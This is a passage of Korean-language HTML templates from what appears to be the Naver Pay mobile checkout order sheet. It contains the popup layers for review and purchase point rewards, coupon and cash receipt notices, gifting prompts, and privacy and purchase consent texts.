					∙ 한달사용 리뷰 작성 추가 포인트는 구매확정 이후 30일까지 리뷰를 작성하고, 한달사용 리뷰를 추가로 작성할 때만 지급됩니다.
				</p>
			{/if}
			<p class="txt">
				∙ 동일 상품(상품번호 기준)에 대한 리뷰 적립 혜택은 리뷰/한달사용 리뷰 각각 1회로 제한되며, 적립 후 30일 경과 시 리뷰 적립혜택을 다시 받을 수 있습니다.
			</p>
			<p class="txt">
				∙ 상품 결제금액 기준 3,000원 미만인 경우 리뷰 작성에 대한 포인트 적립이 제외됩니다.
			</p>
			<p class="txt">
				∙ 상품주문결제 금액에서 구매 적립과 리뷰 적립 포인트를 차감한 금액이 0원 미만(마이너스 금액)일 경우 구매 적립과 리뷰 작성에 대한 포인트 적립이 제외됩니다.
			</p>
			<ul class="benefit_lst review">
				{for index:item in items}
				<li class="benefit_item">
					<div class="tmb">
						<img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH+A1BTQQAsAAAAAAEAAQAAAgJEAQA7" alt="{=item.productName}" data-src="https://m.pay.naver.com{=item.imageUrl}?type=m120" data-error-src="https://img-shop.pstatic.net/front/common/noimg/no_img_120x120.jpg" width="40" height="40"/>
					</div>
					<div class="inr">
						<strong class="tit">{=item.productName}</strong>
						{set commaNormalTextReviewMileage=pug.utility.convertNumberFormat(=item.textReviewMileage.NORMAL)}
						{set commaNormalPhotoVideoPurchaseReviewMileage=pug.utility.convertNumberFormat(=item.photoVideoReviewMileage.NORMAL)}
						{set commaAfterUseTextReviewMileage=pug.utility.convertNumberFormat(=item.textReviewMileage.AFTER_USE)}
						{set commaAfterUsePhotoVideoPurchaseReviewMileage=pug.utility.convertNumberFormat(=item.photoVideoReviewMileage.AFTER_USE)}
						{set commaSubscriberReviewMileage=pug.utility.convertNumberFormat(=item.subscriberReviewMileage)}
						{if (item.textReviewMileage.NORMAL > 0) || (item.photoVideoReviewMileage.NORMAL > 0)}
							<em class="subtit">리뷰 작성 시 포인트 안내</em>
						{/if}
						{if item.textReviewMileage.NORMAL > 0}
							<span class="detail"><span class="review_txt">텍스트 리뷰</span><span class="fr"><strong>{=commaNormalTextReviewMileage}</strong>원</span></span>
						{/if}
						{if item.photoVideoReviewMileage.NORMAL > 0}
							<span class="detail"><span class="review_txt">포토/동영상 리뷰</span><span class="fr"><strong>{=commaNormalPhotoVideoPurchaseReviewMileage}</strong>원</span></span>
						{/if}
						{if (item.textReviewMileage.AFTER_USE > 0) || (item.photoVideoReviewMileage.AFTER_USE > 0)}
							<em class="subtit">한달사용 리뷰 작성 시 추가 포인트 안내</em>
						{/if}
						{if item.textReviewMileage.AFTER_USE > 0}
							<span class="detail"><span class="review_txt">텍스트 리뷰</span><span class="fr"><strong>{=commaAfterUseTextReviewMileage}</strong>원</span></span>
						{/if}
						{if item.photoVideoReviewMileage.AFTER_USE > 0}
							<span class="detail"><span class="review_txt">포토/동영상 리뷰</span><span class="fr"><strong>{=commaAfterUsePhotoVideoPurchaseReviewMileage}</strong>원</span></span>
						{/if}
						{if item.subscriberReviewMileage > 0}
							<span class="detail talktalk"><span class="review_txt">톡톡친구/스토어찜 고객 포인트 추가지급</span><span class="fr"><strong>{=commaSubscriberReviewMileage}</strong>원</span></span>
						{/if}
					</div>
				</li>
				{/for}
			</ul>
		</script>
		
		<div class="ly_bx _layer_firsteasypayuser_mileage" style="top:20px;display:none;">
			<dl class="benefit_wrap benefit_wrap2 _content">
			</dl>
			<div class="cls_btn cls_btn_v2">
				<a href="#" class="_click(checkout.mobile.order.order_sheet.hideLayerFirstEasyPayUserMileage()) _stopDefault">닫기</a>
			</div>
		</div>
		<script type="text/template" class="_tpl_layer_firsteasypayuser_mileage">
			<dt>
				<span class="sp_spot_benefit npay">네이버페이</span> 간편결제 {=paymentMeansType} 첫 {=npayEventType} 혜택
			</dt>
			<dd>
				<p class="txt">네이버페이 <span class="point_color">간편결제 {=paymentMeansType} 첫 {=npayEventType}</span>시 현금처럼 사용가능한 네이버페이 포인트 <span class="point_color">{=npayEventMileageAmountText}</span>원을 즉시 지급해드립니다.</p>
				<p class="txt">{=npayEventType}완료 이후 네이버페이 포인트 지급내역을 바로 확인하실 수 있습니다.<br><a href="https://event2.pay.naver.com/v/m/event/benefit/list{if npayEventType=="등록"}#FIRST_REGISTER{else}#FIRST_USE{/if}" class="btn_txt">자세히보기</a></p>
			</dd>
		</script>
		
		<div class="ly_dim2 _benefitAndCoupon" style="display:none;">&nbsp;</div>
		<div class="pop_wrap _benefitAndCoupon _benefitAndCouponContent" style="top:80px;display:none;">
			<h1>쿠폰 이용안내</h1>
			<div class="ly_cont _benefitAndCouponDiv" style="height:auto;">
				<div id="benefitAndCouponContents">
					<div>
						<strong>쿠폰 이용 안내</strong>
						<ul class="dotlist">
							<li>판매자 쿠폰과 네이버 페이 쿠폰을 각각 1개씩 동시에 사용 가능하며, 스토어찜 할인을 판매자 즉시할인이 선택된 경우에 한하여 판매자별로 1종류 상품에만 사용 가능합니다. </li>
							<li>쿠폰마다 사용제한 조건이 다를 수 있습니다. (적용대상 상품/최대 할인금액/최소 주문금액 등)</li>
							<li>자세한 내용은 [내 쿠폰 목록] 탭에서 확인하실 수 있습니다.</li>
							<li>쿠폰을 사용한 주문을 취소하여 쿠폰사용이 취소된 경우 유효기간 내에서 재발급 되며, 유효기간이 3일 미만 남았거나 지난 경우는 1회 취소일로부터 + 3일로 쿠폰이 재발급 됩니다. </li>
						</ul>
						<div class="_click(checkout.mobile.order.order_sheet.showCouponUsage()) _stopDefault">
							<a href="#" class="b_defn"><div>쿠폰 이용 안내 자세히 보기</div><span class="btall"></span></a>
						</div>
					</div>
				</div>
			</div>
			<a href="#" class="b_del3 _click(checkout.mobile.order.order_sheet.hideBenefitAndCouponLayer()) _stopDefault">닫기</a>
			<div class="mas_gra"></div>
		</div>
		
		<div class="wrap_layer _giftingOrderLayer" style="display:none;">
			<div class="layer_content layer_gift_send">
				<img src="//img.pay.naver.net/o/mstatic/img/service/mobile/order/im/ordersheet/img_gift_send_layer.png?20200130" width="300" height="297" alt="주소를 몰라도 바로 선물 가능! 카카오톡, 휴대폰 연락처로 받는 사람 선택 후 상품 결제. 받는 사람이 배송지 직접 입" class="banner_img">
				<div class="btn_area">
					<a href="#" class="N=a:ode.giftgo btn_gift _click(checkout.mobile.order.order_sheet.switchToGiftingOrder()) _stopDefault"><b class="link">지금 고른 상품 선물하기</b></a>
				</div>
				<button type="button" class="btn_layer_close _click(checkout.mobile.order.order_sheet.hideGiftingOrderLayer()) _stopDefault"><span class="blind">닫기</span></button>
			</div>
		</div>
		
		<div class="wrap_layer _ecouponGiftingOrderLayer" style="display:none;">
			<div class="layer_content layer_gift_send_2">
				<strong class="popup_title">이 상품을 선물하세요</strong>
				<p>네이버ID, 휴대폰 번호, 카카오톡으로<br> 간편하게 보낼 수 있습니다.</p>
				<a href="#" class="N=a:ode.egiftgo npay_common_button type_green_sec size_popup _click(checkout.mobile.order.order_sheet.switchToGiftingOrder()) _stopDefault">선물하기</a>
				<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideEcouponGiftingOrderLayer()) _stopDefault">취소</button>
			</div>
		</div>
		
		<div class="ly_bx layer_cash_receipt_info" style="top: 560px; display:none;">
			<div class="layer_box_inner cash_receipt">
				<strong class="layer_title">현금영수증 발급안내</strong>
				<div class="layer_content">
					<ul class="guide_list">
						<li class="square_bullet">현금영수증은 <span class="point_green">구매확정일 기준</span>으로 발급됩니다.</li>
						<li class="square_bullet">현금영수증 신청정보는 구매확정 전까지 변경이 가능하며, [주문상세정보 &gt; 결제금액정보]의 ‘현금영수증 정보변경’을 통해 수정하실 수 있습니다.</li>
						<li class="square_bullet">네이버페이 포인트로 결제한 경우 현금영수증 신청을 하였더라도 <span class="point_green">신용카드/무통장입금/계좌이체/상품권으로 충전한 충전포인트 금액에 대해서만</span> 현금영수증을 발급합니다.</li>
						<li class="square_bullet">현금영수증에는 개인소득공제용과 사업자증빙용이 있으며, <span class="point_green">세금계산서가 필요하신 경우 사업자증빙용 현금영수증을 신청해주시면 됩니다.</span></li>
						<li class="square_bullet"><span class="point_green">현금영수증(사업자증빙용)은</span> 법인세법 116조 2항 및 부가가치세법 23조 2의 3항에 의해 <span class="point_green">세금계산서와 동일한 자격 및 효력이 있습니다.</span></li>
						<li class="square_bullet">발급된 현금영수증은 네이버페이 PC웹에서 확인 및 출력하실 수 있습니다.</li>
					</ul>
				</div>
				<div class="layer_footer">
					<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideCashReceiptInfoLayer()) _stopDefault"><span>닫기</span></button>
				</div>
			</div>
		</div>
		
		<script type="text/template" class="_tpl_layer_blackconsumer">
			<div class="dimmed _blackconsumerNoticeDimmed"></div>
			<div class="ly_bx _blackconsumerNotice">
				<div class="ly_cont">
					<strong class="pop_tit">구매불가 상품 안내</strong>
					{if customerCenterTelNo != null}
						<p class="pop_notice">회원님은 해당 판매자의 상품 구매가 불가<br>합니다. 자세한 사항은 판매자에게 문의하여<br> 주시기 바랍니다.<br><em class="point_green">{=merchantName}({=customerCenterTelNo})</em></p>
					{else}
						<p class="pop_notice">회원님은 해당 판매자의 상품 구매가 불가<br>합니다. 자세한 사항은 상품 Q&A를 통해<br> 판매자에게 문의하여 주시기 바랍니다.<br></p>
					{/if}
					<div class="pop_btnarea">
						<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideDimmedLayer(blackconsumerNotice)) _stopDefault">확인</button>
					</div>
					<button type="button" class="btn_popclose _click(checkout.mobile.order.order_sheet.hideDimmedLayer(blackconsumerNotice)) _stopDefault"><span class="blind">팝업닫기</span></button>
				</div>
			</div>
		</script>
		
		<script type="text/template" class="_tpl_layer_point_charge">
			<div class="point_link">
				<a href="{=detailLink}" class="N=a:ode.pointchc view_charge">{=message}</a>
			</div>
		</script>
		
		<div class="ly_bx _layer_hopeDeliveryFee" style="top: 560px; display:none;">
			<div class="ly_cont">
			</div>
		</div>
		<script type="text/template" class="_tpl_layer_hopeDeliveryFee">
			<strong class="pop_tit">희망일배송 지역별 배송비</strong>
			<p class="pop_notice">
				{for index:text in hopeDeliveryFeeTexts}
					{=text}<br />
				{/for}
				추가 비용은 착불 등을 통해 별도 지불<br>(판매자 확인 가능)</p>
			<div class="pop_btnarea">
				<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideHopeDeliveryFee()) _stopDefault">확인</button>
			</div>
			<button type="button" class="btn_popclose _click(checkout.mobile.order.order_sheet.hideHopeDeliveryFee()) _stopDefault"><span class="blind">팝업닫기</span></button>
		</script>
		
		<div class="ly_bx agreement _C1AgreementDetail" style="display: none">
			<div class="ly_cont">
				<strong class="agreement_name"><span class="required">필수</span> 개인정보 제공 동의(판매자)</strong>
				<div class="area_description">
					<p class="agreement_description">네이버 회원 계정으로 네이버페이를 이용하여 네이버페이 가맹점에서 제공하는 상품 및 서비스를 구매하고자 할 경우, 네이버파이낸셜㈜는 거래 당사자간 원활한 의사소통 및 배송, 상담 등 거래이행을 위하여 필요한 최소한의 개인정보를 아래와 같이 제공하고 있습니다.</p>
					<ul class="list_description">
						<li class="item_description">
							1. 개인정보를 제공받는 자
							<p class="point_text">상품 및 서비스 판매자</p>
						</li>
						<li class="item_description">
							2. 제공하는 개인정보 항목
							<p>이름, 네이버 아이디, (휴대)전화번호, 상품 수령인 정보(배송상품 : 수령인명, 주소, (휴대)전화번호 / E쿠폰 : 이름, 네이버 아이디, 휴대전화번호), 결제정보(결제수단, 결제금액, 결제일시, 승인유무, 승인번호)</p>
						</li>
						<li class="item_description">
							3. 개인정보를 제공받는 자의 이용목적
							<p class="point_text">판매자와 구매자의 원활한 거래 진행, 본인의사의 확인, 고객상담 및 불만처리/부정이용 방지 등의 고객관리, 물품배송, 새로운 상품/서비스 정보와 고지사항의 안내, 상품/서비스 구매에 따른 혜택 제공</p>
						</li>
						<li class="item_description">
							4. 개인정보를 제공받는 자의 개인정보 보유 및 이용기간
							<p class="point_text">개인정보 이용목적 달성 시까지 보존합니다. 단, 관계 법령의 규정에 의하여 일정 기간 보존이 필요한 경우에는 해당 기간만큼 보관 후 삭제합니다.</p>
						</li>
					</ul>
					<p class="agreement_description">위 개인정보 제공 동의를 거부할 권리가 있으나, 거부 시 네이버페이를 이용한 상품 및 디지털 콘텐츠 구매가 불가능합니다. 그 밖의 내용은 네이버페이 가맹점의 자체 이용약관 및 개인정보처리방침에 따릅니다.</p>
				</div>
				<div class="pop_btnarea">
					<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideAgreeDetailLayer(C1AgreementDetail))">확인</button>
				</div>
			</div>
		</div>
		
		<div class="ly_bx agreement _C2AgreementDetail" style="display: none">
			<div class="ly_cont">
				<strong class="agreement_name"><span class="required">필수</span> 개인정보 제공 동의(판매자)</strong>
				<div class="area_description">
					<p class="agreement_description">네이버 회원 계정으로 네이버페이를 이용하여 네이버페이 가맹점에서 제공하는 상품 및 서비스를 구매하고자 할 경우, 네이버파이낸셜㈜는 거래 당사자간 원활한 의사소통 및 배송, 상담 등 거래이행을 위하여 필요한 최소한의 개인정보를 아래와 같이 제공하고 있습니다.</p>
					<ul class="list_description">
						<li class="item_description">
							1. 개인정보를 제공받는 자
							<p class="point_text">상품 및 서비스 판매자</p>
						</li>
						<li class="item_description">
							2. 제공하는 개인정보 항목
							<p>이름, 네이버 아이디, (휴대)전화번호, 상품 구매정보,결제수단, 상품 수령인 정보 (배송상품:수령인명, 주소, (휴대)전화번호/ E쿠폰:이름, 네이버 아이디, 휴대전화번호)</p>
						</li>
						<li class="item_description">
							3. 개인정보를 제공받는 자의 이용목적
							<p class="point_text">판매자와 구매자의 원활한 거래 진행, 본인의사의 확인, 고객상담 및 불만처리/부정이용 방지 등의 고객관리, 물품배송, 새로운 상품/ 서비스 정보와 고지사항의 안내, 상품/서비스 구매에 따른 혜택 제공</p>
						</li>
						<li class="item_description">
							4. 개인정보를 제공받는 자의 개인정보 보유 및 이용기간
							<p class="point_text">개인정보 이용목적 달성 시까지 보존합니다. 단, 관계 법령의 규정에 의하여 일정 기간 보존이 필요한 경우에는 해당 기간만큼 보관 후 삭제합니다.</p>
						</li>
					</ul>
					<p class="agreement_description">위 개인정보 제공 동의를 거부할 권리가 있으나, 거부 시 네이버페이를 이용한 상품 및 디지털 콘텐츠 구매가 불가능합니다. 그 밖의 내용은 네이버페이 가맹점의 자체 이용약관 및 개인정보처리방침에 따릅니다.</p>
				</div>
				<div class="pop_btnarea">
					<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideAgreeDetailLayer(C2AgreementDetail))">확인</button>
				</div>
			</div>
		</div>
		
		<div class="ly_bx agreement _C3AgreementDetail" style="display: none">
			<div class="ly_cont">
				<strong class="agreement_name"><span class="required">필수</span> 개인정보 제공 동의(판매자)</strong>
				<div class="area_description">
					<p class="agreement_description">네이버 회원 계정으로 네이버페이를 이용하여 안전결제 서비스를 이용하고자 할 경우, 네이버파이낸셜㈜는 당사자간 원활한 의사소통 및 서비스 제공을 위하여 필요한 최소한의 개인정보를 아래와 같이 제공하고 있습니다.</p>
					<ul class="list_description">
						<li class="item_description">
							1. 개인정보를 제공받는 자
							<p class="point_text">상품 및 서비스 판매자</p>
						</li>
						<li class="item_description">
							2. 제공하는 개인정보 항목
							<p>이름, (휴대)전화번호, 주소</p>
						</li>
						<li class="item_description">
							3. 개인정보를 제공받는 자의 이용목적
							<p class="point_text">안전결제를 통한 거래 진행, 물품 배송</p>
						</li>
						<li class="item_description">
							4. 개인정보를 제공받는 자의 개인정보 보유 및 이용기간
							<p class="point_text">개인정보 이용목적 달성 시까지 보존합니다. 단, 관계 법령의 규정에 의하여 일정 기간 보존이 필요한 경우에는 해당 기간만큼 보관 후 삭제합니다.</p>
						</li>
					</ul>
					<p class="agreement_description">위 개인정보 제공 동의를 거부할 권리가 있으나, 거부 시 네이버페이를 이용한 안전결제 서비스 제공이 불가능합니다. 그 밖의 내용은 네이버파이낸셜 개인정보처리방침에 따릅니다.</p>
				</div>
				<div class="pop_btnarea">
					<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideAgreeDetailLayer(C3AgreementDetail))">확인</button>
				</div>
			</div>
		</div>
		
		<div class="ly_bx agreement _customOrderAgreementDetail" style="display: none">
			<div class="ly_cont">
				<strong class="agreement_name">맞춤제작상품<br>구매/교환/반품/환불 제한 동의</strong>
				<div class="area_description" style="max-height:239px">
					<p class="agreement_description">맞춤제작상품이란? 본 상품은 맞춤제작상품으로 특정 주문자 만을 위하여 개별적으로 제작 및 생산되는 상품으로서, 다른 소비자에게 재판매가 불가능한 상품을 의미합니다.</p>
					<p class="agreement_description">·맞춤제작상품은 반품/취소 제한에 동의해야 결제가 진행되며 전자상거래법에 따라 반품/취소가 불가능 할 수 있습니다.</p>
					<p class="agreement_description">·다만, 맞춤제작상품으로 인정되지 않는 상품의 경우 구매자는 반품/취소 제한에 동의하였는지 여부를 불문하고 전자상거래 관련법령에 의거 보호를 받을 수 있습니다.</p>
				</div>
				<div class="pop_btnarea">
					<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideAgreeDetailLayer(customOrderAgreementDetail))">확인</button>
				</div>
			</div>
		</div>
		
		<div class="ly_bx agreement _iiomaDetail" style="display: none">
			<div class="ly_cont">
				<strong class="agreement_name">국외이전 동의</strong>
				<div class="area_description">
					<p class="agreement_description">‘네이버(주)’와 ‘네이버파이낸셜(주)’는 회원님의 개인정보를 안전하게 처리하기 위해 최선을 다하고 있습니다. 네이버페이의 회원계정으로 해외사업자의 상품 또는 해외 주문 및 발주 시스템을 사용하는 가맹점 상품 주문시 아래의 개인정보 국외 이전 동의가 필요합니다. 자세히 읽은 후 동의하여 주시기 바랍니다.</p>
					<ul class="list_description">
						<li class="item_description">
							1. 이전되는 개인정보 항목
							<p>이름, 네이버아이디, (휴대)전화번호, 상품구매정보, 상품수령인정보(수령인명, 주소, (휴대)전화번호), 개인통관고유부호(통관 필요 상품 주문 시에만 해당)</p>
						</li>
						<li class="item_description">
							2. 이전되는 국가
							<p></p>
						</li>
						<li class="item_description">
							3. 이전 일시 및 방법
							<p>결제 완료 시 시스템(온라인)을 통한 제공</p>
						</li>
						<li class="item_description">
							4. 이전받는 자의 성명
							<p class="point_text"></p>
						</li>
						<li class="item_description">
							5. 정보관리책임자 연락처
							<p class="point_text"></p>
						</li>
						<li class="item_description">
							6. 개인정보 이용 목적
							<p class="point_text">판매자와 구매자의 원활한 거래 진행, 본인의사의 확인, 고객상담 및 불만처리/부정이용 방지 등의 고객관리, 물품배송, 통관, 새로운 상품/서비스 정보와 고지사항의 안내, 상품/서비스 구매에 따른 혜택 제공</p>
						</li>
						<li class="item_description">
							7. 개인정보 보유 · 이용 기간
							<p class="point_text">개인정보 이용목적 달성 시까지 보존합니다. 단, 관계 법령의 규정에 의하여 일정 기간 보존이 필요한 경우에는 해당 기간만큼 보관 후 삭제합니다.</p>
						</li>
					</ul>
					<p class="agreement_description">정보주체는 위 개인정보 국외 이전 동의를 거부할 권리가 있으나, 동의 거부 시 서비스 제공에 제한을 받을 수 있습니다.</p>
				</div>
				<div class="pop_btnarea">
					<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideAgreeDetailLayer(iiomaDetail))">확인</button>
				</div>
			</div>
		</div>
		
		<div class="ly_bx agreement _traditionalAlcoholAgreementDetail" style="display: none">
			<div class="ly_cont">
				<strong class="agreement_name">구매정보 제3자 제공 동의</strong>
				<div class="area_description">
					<ul class="list_description">
						<li class="item_description">
							1. 제공받는 자
							<p class="point_text">관할세무서</p>
						</li>
						<li class="item_description">
							2. 제공 항목
							<p>주문자 인적사항(이름, 생년월일, 주소), 주문정보(주문일자, 상품명 수량, 금액 등)</p>
						</li>
						<li class="item_description">
							3. 제공 목적
							<p class="point_text">국세청 고시에 따른 주류 통신판매 주문에 대한 분기별 명세서 제출</p>
						</li>
						<li class="item_description">
							4. 보유 및 이용기간
							<p class="point_text">국세청 고시 등 내부 기준에 따름</p>
						</li>
					</ul>
					<p class="agreement_description">정보 주체는 위 개인정보 제3자 제공 동의를 거부할 권리가 있습니다. 단, 동의하지 않을 경우 서비스 이용이 제한됩니다.</p>
				</div>
				<div class="pop_btnarea">
					<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideAgreeDetailLayer(traditionalAlcoholAgreementDetail))">확인</button>
				</div>
			</div>
		</div>
		
		<div class="ly_bx agreement _preOrderAgreementDetail" style="display: none">
			<div class="ly_cont">
				<strong class="agreement_name">예약구매 상품 구매 및<br>취소 관련 동의</strong>
				<div class="area_description" style="max-height:239px">
					<p class="agreement_description">예약구매 상품은 일정기간 동안 주문을 사전에 모집하고 주문기간이 종료된 후 예정된 일자에 일괄로 발송하는 형태의 사전예약 상품입니다.</p>
					<p class="agreement_description">·예약구매 상품의 특성상 주문종료 후 실제 발송일까지 시간이 소요될 수 있습니다. 발송예정일을 확인한 후 주문을 진행하여 주시기 바랍니다.</p>
					<p class="agreement_description">·예약구매 상품의 경우 주문기간동안 <em>최소 주문수량에 미달하는 경우 판매자에 의해 주문이 취소될 수 있습니다.</em></p>
					<p class="agreement_description">주문시점 위의 내용을 인지하고 주문을 진행하시기 바랍니다.</p>
				</div>
				<div class="pop_btnarea">
					<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideAgreeDetailLayer(preOrderAgreementDetail))">확인</button>
				</div>
			</div>
		</div>
		
		<script type="text/template" class="_tpl_easy_pay_card_info">
			<span class="type">{=sCardType}</span>
			<div class="card_name">
				<span class="card_no"><span class="blind">카드 뒤 4자리</span>({=sCardNo})</span>
				<p class="name"><span class="blind">카드명</span>{=sCardName}</p>
			</div>
		</script>
		
		<script type="text/template" class="_tpl_layer_bank_panel">
			<li class="flick-ct flick-ct-dmm _flickPanel" style="transition-property: -webkit-transform; transition-duration: 0ms; transform: translate(0px, 0px); float: left; width: 6.66666666666667%; left: 0%; z-index: 10;" data-code="{=bankCode}" data-account-key="{=accountKey}">
				<input type="hidden" class="_paymentMethod" value="{=bankCode}">
				<div class="flick-wrap">
					{if payPartnershipItemCode != null && payPartnershipItemCode != ""}
						{set easyPayBankClass = (=payPartnershipItemCode)}
					{else}
						{set easyPayBankClass = 'bank_' + (=bankCode)}
					{/if}
					<div class="simplepay_select {=easyPayBankClass}">
						<span class="sp_ordersheet button_checked"></span>
						{if isPayable}
							<div class="card_select bank sp_bank">
							<span class="blind">{=bankCode}</span>
								<strong class="account_name noname">
									{if nickName != null && nickName != ""}
										{=nickName}
									{elseif payPartnershipItemName != null && payPartnershipItemName != ""}
										{=payPartnershipItemName}
									{else}
										계좌번호
									{/if}</strong>
								<p class="card_number">{=maskedAccountNo}</p>
							</div>
						{else}
							<div class="card_select bank sp_bank disabled">
								<span class="blind">{=bankCode}</span>
								<span class="checking">점검중</span>
								<p class="disable_text">은행 시스템 점검으로 인해 해당 계좌로<br>간편결제를 이용하실 수 없습니다.</p>
							</div>
						{/if}
					</div>
				</div>
			</li>
		</script>
		
		<script type="text/template" class="_tpl_purchase_benefit">
			{set commaTotal=pug.utility.convertNumberFormat(=TOTAL)}
		
			<div class="benefit_summary">
				<strong>구매적립<button type="button" class="N=a:ode.beneinfo sp_ordersheet_icon icon_help2 _click(checkout.mobile.order.order_sheet.showLayerPayMileage()) _stopDefault"><span class="blind">도움말</span></button></strong>
				<em class="summary_num">총 {=commaTotal}원</em>
			</div>
		
			<ul class="inner_list">
				{set commaTotalPurchaseMileage=pug.utility.convertNumberFormat(=TOTAL_PURCHASE)}
				{set commaTotalAdditionalMileage=pug.utility.convertNumberFormat(=TOTAL_ADDITIONAL)}
				{set commaBankEventMileage=pug.utility.convertNumberFormat(=BANK_EVENT)}
				{set commaMembershipPoint=pug.utility.convertNumberFormat(=TOTAL_MEMBERSHIP)}
				{set commaTotalChargedPoint=pug.utility.convertNumberFormat(=TOTAL_CHARGED_POINT)}
				{set commaTotalChargedPointAdditional=pug.utility.convertNumberFormat(=TOTAL_CHARGED_POINT_ADDITIONAL)}
				{set commaTotalAdminAdditionalPoint=pug.utility.convertNumberFormat(=TOTAL_ADMIN_ADDITIONAL)}
		
				{if (TOTAL_PURCHASE > 0)}
				<li>
					<span class="benefit_name">기본적립</span>
					<span class="benefit_sum"><em>{=commaTotalPurchaseMileage}</em>원</span>
				</li>
				{/if}
				{if (TOTAL_ADMIN_ADDITIONAL > 0)}
				<li>
						<span class="benefit_name">상품구매 추가적립</span>
					<span class="benefit_sum"><em>{=commaTotalAdminAdditionalPoint}</em>원</span>
				</li>
				{/if}
				{if (TOTAL_SCM > 0)}
				{for item in items}
				{set commaSellerCustomerManagementMileage=pug.utility.convertNumberFormat(=item.amount)}
				<li>
					<span class="benefit_name">{=item.key}</span>
					<span class="benefit_sum"><em>{=commaSellerCustomerManagementMileage}</em>원</span>
				</li>
				{/for}
				{/if}
				{if (TOTAL_ADDITIONAL > 0)}
				<li>
					<span class="benefit_name">파워적립</span>
					<span class="benefit_sum"><em>{=commaTotalAdditionalMileage}</em>원</span>
				</li>
				{/if}
				{if (TOTAL_INFLOW > 0)}
					{for inflowBenefit in inflowBenefits}
						{set commaInflowBenefitMileage=pug.utility.convertNumberFormat(=inflowBenefit.mileage.amount)}
						{if !inflowBenefit.mileage.membershipImageYn}
							<li>
								<span class="benefit_name">{=inflowBenefit.key}</span>
								<span class="benefit_sum"><em>{=commaInflowBenefitMileage}</em>원</span>
							</li>
						{/if}
					{/for}
				{/if}
				{if (BANK_EVENT > 0)}
				<li>
					<span class="benefit_name">첫 계좌 등록 시</span>
					<span class="benefit_sum"><em>{=commaBankEventMileage}</em>원</span>
				</li>
				{/if}
				{if (TOTAL_INFLOW > 0)}
					{for inflowBenefit in inflowBenefits}
						{set commaInflowBenefitMileage=pug.utility.convertNumberFormat(=inflowBenefit.mileage.amount)}
						{if inflowBenefit.mileage.membershipImageYn}
							<li>
								<span class="benefit_name">{=inflowBenefit.key} <span class="ico_npmember type_abbr"><span class="blind">네이버플러스 멤버십</span></span></span>
								<span class="benefit_sum"><em>{=commaInflowBenefitMileage}</em>원</span>
							</li>
						{/if}
					{/for}
				{/if}
				{if (TOTAL_CHARGED_POINT > 0)}
				<li>
					<span class="benefit_case">충전포인트 결제적립</span>
					<span class="benefit_sum"><em>{=commaTotalChargedPoint}</em>원</span>
				</li>
				{/if}
				{if (TOTAL_CHARGED_POINT_ADDITIONAL > 0)}
				<li>
					<span class="benefit_case">네이버통장 추가적립</span>
					<span class="benefit_sum"><em>{=commaTotalChargedPointAdditional}</em>원</span>
				</li>
				{/if}
				{if (TOTAL_MEMBERSHIP > 0)}
				<li class="membership_item">
					<span class="benefit_name">멤버십 추가적립 <span class="ico_npmember type_abbr"><span class="blind">네이버플러스 멤버십</span></span>
						
					</span>
					<span class="benefit_sum"><b>{=commaMembershipPoint}</b>원</span>
					<div class="_tpl_membership_help_layer tooltip_box tooltip_family" style="z-index:1000;display:none;">
						<dl class="lay_content _content"></dl>
						<a href="#" class="btn_close_layer type_new _click(checkout.mobile.order.order_sheet.hideMembershipItemHelp()) _stopDefault"><span class="blind">도움창 닫기</span></a>
					</div>
				</li>
				{/if}
			</ul>
		</script>
		
		<script type="text/template" class="_tpl_card_benefit s_benefit_item type_ellipsis">
			<div class="benefit_summary">
				<strong>혜택카드적립<button type="button" class="sp_ordersheet_icon icon_help2 _click(checkout.mobile.order.order_sheet.showLayerCardBenefit())"><span class="blind">도움말</span></button></strong>
				{set cardBenefitPoint=pug.utility.convertNumberFormat(=commaCardBenefitPoint)}
				<em class="summary_num">최대 {=cardBenefitPoint}원</em>
			</div>
		</script>
		
		
		<script type="text/template" class="_tpl_review_benefit">
			{if (TOTAL > 0)}
				{set commaMaxReviewMilease=pug.utility.convertNumberFormat(=MAX_REVIEW_MILEASE)}
				<div class="benefit_summary">
					<strong>리뷰적립<button type="button" class="N=a:ode.revinfo sp_ordersheet_icon icon_help2 _click(checkout.mobile.order.order_sheet.showLayerReviewMileage()) _stopDefault"><span class="blind">도움말</span></button></strong>
					<em class="summary_num">최대 {=commaMaxReviewMilease}원</em>
				</div>
			{/if}
		</script>
		
		<script type="text/template" class="_tpl_register_account_benefit">
			{set commaBankEventMileage=pug.utility.convertNumberFormat(=BANK_EVENT)}
			<strong>등록적립<button type="button" class="sp_ordersheet_icon icon_help2 _click(checkout.mobile.order.order_sheet.showLayerFirstEasyPayUserMileage(계좌,등록,{=BANK_EVENT})) _stopDefault"><span class="blind">도움말</span></button></strong>
			<ul class="inner_list">
				<li>
					<span class="benefit_name">첫 계좌 등록 시</span>
					<span class="benefit_sum"><b>{=commaBankEventMileage}</b>원</span>
				</li>
			</ul>
		</script>
		
		<script type="text/template" class="_tpl_review_benefit_guide_c1">
			<div class="desc_text">
				<p>동일 상품의 상품리뷰 적립은 1회로 제한됩니다.</p>
			</div>
		</script>
		
		<script type="text/template" class="_tpl_review_benefit_guide_c2">
			<div class="desc_text">
				<p>동일 상품의 상품리뷰/한달사용리뷰 적립은 각각 1회로 제한됩니다.</p>
			</div>
		</script>
		
		<div class="ly_bx _layer_adult_authentication" style="display:none">
			<div class="ly_cont adult_certify _adultAuthentication">
				<strong class="pop_tit">알려드립니다.</strong>
				<p class="pop_text">주류 상품 구매 시 관계법령에 따라
					개인정보 제공 동의 및 <span class="point_red">19세 이상 본인인증</span>을
					거쳐야 구매하실 수 있습니다.</p>
				<div class="pop_btnarea">
